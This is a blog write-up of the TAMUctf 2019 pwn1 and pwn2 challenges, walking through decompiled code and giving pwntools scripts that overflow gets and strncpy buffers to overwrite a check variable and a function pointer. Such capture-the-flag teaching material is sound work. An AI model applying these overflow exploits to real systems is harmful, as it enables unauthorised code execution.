---
layout: post
title: TAMUctf 2019 - pwn1 and pwn2
date: 2023-12-16
categories: [Binary Exploitation, Buffer Overflow]
tags: [BOF]
---


In this post I will cover the first two pwn challenges from the 2019 edition of TAMUctf. I will make another post on challenges 3 through 5 at a later date. The first challenge is pwn1.

## pwn1

We were not give any `flag.txt` file, so we are gonna create our own! Let's inspect the file

```
$ pwn checksec pwn1

[*] '/home/pwn1'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

We are dealing with a 32-bit ELF, with Full RELRO, NX and PIE. With a particular reader in mind, I will briefly explain those protections:

- Position Independent Executable (PIE)

If PIE is enabled, each time you run the binary it gets loaded into memory at a different address. This means no hardcoded function addresses or gadget locations. While the addresses are random, the offset between diferent parts of the memory is not. 

For example, if we know that the `getFlag` function is located 0x40 bytes after the `main` function in one run, it will still be located 0x40 bytes after the `main` function in the next run. Therefore, we can use this offset to calculate the address of the `getFlag` function in subsequent runs.

- Full RELRO

Full RELRO (RELocation Read Only) makes the GOT (Global Offset Table) read-only. This is not the default, since it greatly increases the start-up time, as ALL symbols need to be resolved before the binary starts. What this means is that we can't overwrite the GOT.

- NX

NX (No eXecute) marks certain areas of the program as non-executable, meaning it cannot be executed as code. This prevents us from jumping to shellcode stored on the stack or in a global variable.

With that out of the way, let's run the binary

```
$ ./pwn1

Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
Andrei, what's yours?
I don't know that! Auuuuuuuugh!
```

It prompted us for our name, and it appears to not know it's own. Let's open the file in Ghidra and look at the main function (keep in mind I renamed some variables, to make it look pretty)

```c
int main(void)

{
   int ComparisonValue;
   char UserInput [43];
   int Target;
   undefined4 local_14;
   undefined *local_10;
   
   local_10 = &stack0x00000004;
   setvbuf(_stdout,(char *)0x2,0,0);
   local_14 = 2;
   Target = 0;
   puts(
         "Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other  side he see."
         );
   puts("What... is your name?");
   fgets(UserInput,0x2b,_stdin);
   ComparisonValue = strcmp(UserInput,"Sir Lancelot of Camelot\n");
   if (ComparisonValue != 0) {
      puts("I don\'t know that! Auuuuuuuugh!");
                               /* WARNING: Subroutine does not return */
      exit(0);
   }
   puts("What... is your quest?");
   fgets(UserInput,0x2b,_stdin);
   ComparisonValue = strcmp(UserInput,"To seek the Holy Grail.\n");
   if (ComparisonValue != 0) {
      puts("I don\'t know that! Auuuuuuuugh!");
                               /* WARNING: Subroutine does not return */
      exit(0);
   }
   puts("What... is my secret?");
   gets(UserInput);
   if (Target == -0x215eef38) {
      print_flag();
   }
   else {
      puts("I don\'t know that! Auuuuuuuugh!");
   }
   return 0;
}
```

So we see that the function:

**line 12** - Initializes `Target` with the value of 0.

**line 17** - Asks us for our name, then stores the input in a `0x2b` byte buffer (43 in decimal). Afterwards, it uses `strcmp` to compare our input with the string `Sir Lancelot of Camelot\n`, storing the output of the function into the `ComparisonValue` variable. 

**line 20** - If `ComparisonValue` is not 0, it means that our input didn't match the aforementioned string. In that case, it prints out `I don\'t know that! Auuuuuuuugh!` and exits. If `ComparisonValue` is 0, it proceeds to ask us what our quest it.

**line 26** - Similarly to the previous check, it stores the input in a `0x2b` byte buffer, and uses `strcmp` to compare our input with the string `T  o seek the Holy Grail.\n`. If the comparison fails, we get `I don\'t know that! Auuuuuuuugh!` again.

**line 33** - It prompts us for the secret, and uses `gets` to read our input. Then it checks to see if `Target` is `-0x215eef38` (`0xDEA110C8` unsigned). If true, it calls the `print_flag` function, otherwise it prints out `I don\'t know that! Auuuuuuuugh!`.

Let's check the `print_flag` function

```c
void print_flag(void)

{
   FILE *FileWithTheFlag;
   int i;
   
   puts("Right. Off you go.");
   FileWithTheFlag = fopen("flag.txt","r");
   while( true ) {
      i = _IO_getc(FileWithTheFlag);
      if ((char)i == -1) break;
      putchar((int)(char)i);
   }
   putchar(10);
   return;
}
```

This function opens the `flag.txt` file, and prints out the characters one by one. If at any moment the character is `-1`, it means that the end of the file has been reached, and it stops.

To complete this challenge we must overwrite the value of `Target` to `0xDEA110C8` (the unsigned version of `-0x215eef38`), as this will make us pass the check and run the `print_flag` function. To make it clear how we can achieve this, let's observe the highlighted code in this picture:

![main function](/assets/Image11.png)

We notice that the function `gets` (which is vulnerable to BOF) is used to store our input into the `UserInput` variable, whose allocated a buffer of 43 bytes. As such, there is a 43 byte offset between `UserInput` and `Target`, which we can fill to subsequently overwrite the value of `Target`. 

All in all, the exploit should look something like this

```python
from pwn import *

# Initialize the ELF file
elf = ELF("pwn1")

# Start the process
process = process(elf.path)

# Padding in order to reach the 'Target' variable
payload = b"A"* 43

# The value we will overwrite 'Target' with in order for the final 'if' statement to return true and call the 'print_flag' function
payload += p32(0xdea110c8)

# The strings we need to send to pass the first two checks and reach the 'gets()' call
process.sendline("Sir Lancelot of Camelot")
process.sendline("To seek the Holy Grail.")

# Send the payload
process.sendline(payload)
process.interactive()
```

If we try running the exploit...

```
$ python3 exploit_pwn1.py

[*] '/home/pwn1'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/home/andrei/Workshop/pwn1': pid 109855
/home/andrei/Workshop/exploit_pwn1.py:17: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  process.sendline("Sir Lancelot of Camelot")
/home/andrei/Workshop/exploit_pwn1.py:18: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  process.sendline("To seek the Holy Grail.")
[*] Switching to interactive mode
[*] Process '/home/andrei/Workshop/pwn1' stopped with exit code 0 (pid 109855)
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
What... is your quest?
What... is my secret?
Right. Off you go.
flag{sm4rt_ph0wned!}
```

*Jackpot*


## pwn2

As always, let's start by inspecting the file

```
$ pwn checksec pwn2

[*] '/home/andrei/Workshop/pwn2'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Again, we are confronted with a 32 bit ELF with Full RELRO, NX and PIE. First, let's try running it

```
$ ./pwn2

Which function would you like to call?
print_flag
```

The binary prompts us for the name (or address?) of the function which we want to call. I attempted `print_flag`, which was the lowest hanging fruit, to no avail. Upon analyzing the main function in Ghidra

```c
int main(void)

{
   char UserInput [31];
   undefined *local_10;
   
   local_10 = &stack0x00000004;
   setvbuf(_stdout,(char *)0x2,0,0);
   puts("Which function would you like to call?");
   gets(UserInput);
   select_func(UserInput);
   return 0;
}
```

We discover that the function allocates a 31 byte buffer to the `UserInput` variable, which it reads from `stdin` using the BOF vulnerable `gets` function. This variable is then passed as an argument to the `select_func` function. Let's see what `select_func` does

```c
void select_func(char *argument)

{
   int i;
   char ArgumentBuffer [30];
   code *FunctionAddress;
   
   FunctionAddress = two;
   strncpy(ArgumentBuffer,argument,0x1f);
   i = strcmp(ArgumentBuffer,"one");
   if (i == 0) {
      FunctionAddress = one;
   }
   (*FunctionAddress)();
   return;
}
```

This function:

- Creates a 30 byte buffer, `ArgumentBuffer`
- Initializes `FunctionAddress` as the address of the function `two`
- Copies `0x1f` (31 decimal) bytes from `argument` into the `ArgumentBuffer` buffer using `strncpy`
- If `argument` is the string "one", it calls the function `one` by casting a pointer. 

Since `strncpy` copies 31 bytes into a 30 byte buffer, we have a buffer overflow. To complete this challenge, we need to overwrite the last byte of `FunctionAddress` (which is initialized as the address of the `two` function) with the last byte of `print_flag` 's address. This will make the function cast a pointer to `print_flag`. Let's use `pwngdb` to get the address of these two functions.

```
$ gdb pwn2

pwndbg> info functions

All defined functions:

<SNIP>

0x000006ad  two
0x000006d8  print_flag

<SNIP>
```

We have all the information we need to create the exploit

```python
from pwn import *

# Initialize the ELF file
elf = ELF("pwn2")

# Start the process
process = process(elf.path)

# Padding needed to reach 'FunctionAddress'
payload = b"A"* 30

# The last byte of "print_flag"'s address. This will overwrite the last byte of 'FunctionAddress',
# which was initiliazed as the address of `two`.
payload += p32(0xd8)

# Send the payload
process.sendline(payload)
process.interactive()
```

Upon running it...

```
$ python3 exploit_pwn2.py

[*] '/home/andrei/Workshop/pwn2'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/home/andrei/Workshop/pwn2': pid 142403
[*] Switching to interactive mode
Which function would you like to call?
This function is still under development.
flag{mmmmmmmm_m0nst3rk1ll}
```

We are done!
